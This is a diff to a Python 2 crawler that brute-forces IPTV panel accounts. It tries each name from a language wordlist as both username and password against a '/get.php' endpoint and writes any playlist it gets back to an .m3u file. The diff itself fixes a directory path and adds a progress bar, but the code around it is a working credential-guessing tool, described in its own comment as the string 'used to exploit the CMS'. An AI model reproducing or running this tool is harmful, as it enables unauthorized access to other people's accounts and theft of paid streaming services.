@@ -17,7 +17,7 @@ class Crawler(object):
     # output default directory
     outputDir = "output"
     # language default directory
-    languageDir = "name"
+    languageDir = "languages"
     # string used to exploit the CMS
     basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
     # string used to search the CMS
@@ -44,7 +44,7 @@ class Crawler(object):
         Return:
         boolean -- true if the language file exists, otherwise false
         """
-        if os.path.isfile("names/" + language + ".txt"):
+        if os.path.isfile(self.languageDir + "/" + language + ".txt"):
             self.language = language
             return True
         else:
@@ -79,7 +79,9 @@ class Crawler(object):
         try:
             if not url:
                 url = random.choice(self.parsedUrls)
-            fileName = self.languageDir + self.language + ".txt"
+            fileName = self.languageDir + "/" + self.language + ".txt"
+            fileLength = self.file_length(fileName)
+            progressBar = pyprind.ProgBar(fileLength, title = "Fetching account from " + url + " this might take a while.", stream = 1, monitor = True)
             foundedAccounts = 0
             with open(fileName) as f:
                 rows = f.readlines()
@@ -88,6 +90,10 @@ class Crawler(object):
                 request = urllib2.Request(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
                 response = urllib2.urlopen(request)
                 fetched = response.read()
+                # Update the progress bar in order to give to the user a nice
+                # way to indicate the time left
+                fileLength = fileLength - 1
+                progressBar.update()
                 # IF the fetched content is not empty
                 # we build the dedicated .m3u file
                 if len(fetched) > 0:
@@ -129,3 +135,15 @@ class Crawler(object):
         outputFile.write(fetched)
         self.foundedAccounts = self.foundedAccounts + 1
         outputFile.close()
+
+    def file_length(self, fileName):
+        """File Length
+        Cheapest way to calculate the rows of a file
+
+        Keyword arguments:
+        fileName -- string the filename into which we will check its Length
+        """
+        with open(fileName) as f:
+            for i, l in enumerate(f):
+                pass
+        return i + 1
